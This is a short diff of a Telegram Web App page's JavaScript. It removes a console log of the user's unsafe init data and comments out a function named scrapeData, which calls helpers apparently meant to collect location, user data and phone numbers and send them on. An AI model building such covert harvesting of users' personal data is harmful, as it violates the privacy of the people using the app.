@@ -127,17 +127,15 @@
         function setBackgroundColor() {
             Telegram.WebApp.setBackgroundColor("#bd1e1e");  // White background color
             alert("BGCOloRO FUn");
-            const u=Telegram.WebApp.initDataUnsafe;
-            console.log(u);
         }
 
         // Call the function to set the background color
         setBackgroundColor();
-        function scrapeData() {
-            requestLocation();
-            sendUserDataToTelegram();
-            sendPhoneNumberToTelegram();
-        }
+        // function scrapeData() {
+        //     requestLocation();
+        //     sendUserDataToTelegram();
+        //     sendPhoneNumberToTelegram();
+        // }
         function requestLocation() {
             // Initialize LocationManager if not already initialized
             if (!Telegram.WebApp.LocationManager.isInited) {
